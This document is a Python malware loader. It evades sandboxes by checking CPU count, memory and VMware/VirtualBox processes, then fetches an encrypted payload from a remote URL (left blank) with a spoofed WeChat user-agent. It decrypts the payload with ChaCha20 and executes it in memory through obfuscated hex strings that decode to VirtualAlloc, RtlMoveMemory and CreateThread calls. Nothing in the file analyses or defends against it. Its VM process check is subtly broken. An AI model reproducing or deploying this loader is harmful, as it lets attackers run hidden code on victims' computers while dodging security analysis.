import requests
from Crypto.Cipher import ChaCha20
import tkinter
import tkinter.messagebox
import json
import psutil
import base64
from binascii import a2b_hex
import ctypes
import time


def getcode():
    url = ''
    headers = {
        'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 MicroMessenger/6.5.2.501 NetType/WIFI WindowsWechat',
        'referer':'https://api.weixin.qq.com'
    }
    redata = {}
    re = requests.post(url,headers = headers,data = redata)
    return json.loads(re.text)

def checksystem():
    cpunum = psutil.cpu_count(logical=True)
    mem = psutil.virtual_memory()
    process = psutil.pids()
    blockname = ['Vmtoolsd.exe','Vmwaretrat.exe','Vmwareuser.exe','Vmacthlp.exe','vboxservice.exe','vboxtray.exe']
    if cpunum < 4:
        return False
    if mem.total < 4294967296:
        return False
    for pid in process:
        p = psutil.Process(pid)
        for bname in blockname:
            if p.name() == blockname:
                return False
    
def decrypt(key,nonce,body):
    key = key.encode('utf-8')
    nonce = a2b_hex(str(base64.b64decode(nonce),'utf-8'))
    body = a2b_hex(str(base64.b64decode(body),'utf-8'))
    cipher = ChaCha20.new(key=key,nonce=nonce)
    ciphertext = cipher.decrypt(body)
    return ciphertext

def neworldX(body):
    body = decrypt(c0d3['key'],c0d3['nonce'],c0d3['ciphertext'])
    zh3iic0d3 = bytearray(a2b_hex(base64.b64decode(body)))
    LunaticRedEyes1_1 = '63redeye4redeye9redeyeReiseneye32eredeyeredeye696e646c6c2e6b65r'
    LunaticRedEyes1_2 = 'edeye26e656c33322e5669redeye2redeye4redeye5616c416c6c6f632erede'
    LunaticRedEyes1_3 = 'ye265redeye3redeye4redeye9redeye065203d2063redeye4redeye9redeye'
    LunaticRedEyes1_4 = 'Reiseneye32e635fredeye5696eredeye43634'
    LunaticRedEyes1 = LunaticRedEyes1_1+LunaticRedEyes1_2+LunaticRedEyes1_3+LunaticRedEyes1_4
    LunaticRedEyes2_1 = '616c696365203d2063redeye4redeye9redeyeReiseneye32eredeyeredeye6'
    LunaticRedEyes2_2 = '96e646c6c2e6b65redeye26e656c33322e5669redeye2redeye4redeye5616c'
    LunaticRedEyes2_3 = '416c6c6f632863redeye4redeye9redeyeReiseneye32e635f696eredeye428'
    LunaticRedEyes2_4 = '30292c2063redeye4redeye9redeyeReiseneye32e635f696eredeye4286c65'
    LunaticRedEyes2_5 = '6e28redeye4redeye9656eredeye329292c2063redeye4redeye9redeyeReis'
    LunaticRedEyes2_6 = 'eneye32e635f696eredeye42830redeye833303030292c2063redeye4redeye'
    LunaticRedEyes2_7 = '9redeyeReiseneye32e635f696eredeye42830redeye834302929'
    LunaticRedEyes2 = LunaticRedEyes2_1+LunaticRedEyes2_2+LunaticRedEyes2_3+LunaticRedEyes2_4+LunaticRedEyes2_5+LunaticRedEyes2_6+LunaticRedEyes2_7
    LunaticRedEyes3_1 = 'redeye3616bredeye5redeye961203d202863redeye4redeye9redeyeReisen'
    LunaticRedEyes3_2 = 'eye32e635f636861redeye2202a206c656e28redeye4redeye9656eredeye32'
    LunaticRedEyes3_3 = '9292e66redeye26f6d5f62redeye5666665redeye228redeye4redeye9656er'
    LunaticRedEyes3_4 = 'edeye329'
    LunaticRedEyes3 = LunaticRedEyes3_1+LunaticRedEyes3_2+LunaticRedEyes3_3+LunaticRedEyes3_4
    LunaticRedEyes4_1 = '63redeye4redeye9redeyeReiseneye32eredeyeredeye696e646c6c2e6b65r'
    LunaticRedEyes4_2 = 'edeye26e656c33322e52redeye46c4d6fredeye6654d656d6fredeye2redeye'
    LunaticRedEyes4_3 = '92863redeye4redeye9redeyeReiseneye32e635fredeye5696eredeye43634'
    LunaticRedEyes4_4 = '28616c696365292c20redeye3616bredeye5redeye9612c2063redeye4redey'
    LunaticRedEyes4_5 = 'e9redeyeReiseneye32e635f696eredeye4286c656e28redeye4redeye9656e'
    LunaticRedEyes4_6 = 'redeye3292929'
    LunaticRedEyes4 = LunaticRedEyes4_1+LunaticRedEyes4_2+LunaticRedEyes4_3+LunaticRedEyes4_4+LunaticRedEyes4_5+LunaticRedEyes4_6
    LunaticRedEyes5_1 = '63redeye4redeye9redeyeReiseneye32eredeyeredeye696e646c6c2e6b65r'
    LunaticRedEyes5_2 = 'edeye26e656c33322e5redeye6169redeye4466fredeye253696e6redeye6c6'
    LunaticRedEyes5_3 = '54f626a6563redeye42863redeye4redeye9redeyeReiseneye32e635f696er'
    LunaticRedEyes5_4 = 'edeye42863redeye4redeye9redeyeReiseneye32eredeyeredeye696e646c6'
    LunaticRedEyes5_5 = 'c2e6b65redeye26e656c33322e43redeye26561redeye4655468redeye26561'
    LunaticRedEyes5_6 = '642863redeye4redeye9redeyeReiseneye32e635f696eredeye42830292c20'
    LunaticRedEyes5_7 = '63redeye4redeye9redeyeReiseneye32e635f696eredeye42830292c2063re'
    LunaticRedEyes5_8 = 'deye4redeye9redeyeReiseneye32e635fredeye5696eredeye4363428616c6'
    LunaticRedEyes5_9 = '96365292c2063redeye4redeye9redeyeReiseneye32e635f696eredeye4283'
    LunaticRedEyes5_10 = '0292c2063redeye4redeye9redeyeReiseneye32e635f696eredeye42830292'
    LunaticRedEyes5_11 = 'c2063redeye4redeye9redeyeReiseneye32eredeye06f696eredeye465rede'
    LunaticRedEyes5_12 = 'ye22863redeye4redeye9redeyeReiseneye32e635f696eredeye4283029292'
    LunaticRedEyes5_13 = '9292c63redeye4redeye9redeyeReiseneye32e635f696eredeye4282d312929'
    LunaticRedEyes5 = LunaticRedEyes5_1+LunaticRedEyes5_2+LunaticRedEyes5_3+LunaticRedEyes5_4+LunaticRedEyes5_5+LunaticRedEyes5_6+LunaticRedEyes5_7+LunaticRedEyes5_8+LunaticRedEyes5_9+LunaticRedEyes5_10+LunaticRedEyes5_11+LunaticRedEyes5_12+LunaticRedEyes5_13
    L1 = (a2b_hex(bytes(LunaticRedEyes1.replace('Reisen','065red').replace('redeye','7'),'utf-8')).decode().replace('sakuya','zh3n91').replace('tyens','zh3iic0d3'))
    L2 = (a2b_hex(bytes(LunaticRedEyes2.replace('Reisen','065red').replace('redeye','7'),'utf-8')).decode().replace('sakuya','zh3n91').replace('tyens','zh3iic0d3'))
    L3 = (a2b_hex(bytes(LunaticRedEyes3.replace('Reisen','065red').replace('redeye','7'),'utf-8')).decode().replace('sakuya','zh3n91').replace('tyens','zh3iic0d3'))
    L4 = (a2b_hex(bytes(LunaticRedEyes4.replace('Reisen','065red').replace('redeye','7'),'utf-8')).decode().replace('sakuya','zh3n91').replace('tyens','zh3iic0d3'))
    L5 = (a2b_hex(bytes(LunaticRedEyes5.replace('Reisen','065red').replace('redeye','7'),'utf-8')).decode().replace('sakuya','zh3n91').replace('tyens','zh3iic0d3'))
    exec(L1+'\n'+L2+'\n'+L3+'\n'+L4+'\n'+L5)

time.sleep(10)
cvm = checksystem()
if cvm == False:
    exit()
else:
    c0d3 = getcode()
    neworldX(c0d3)



    











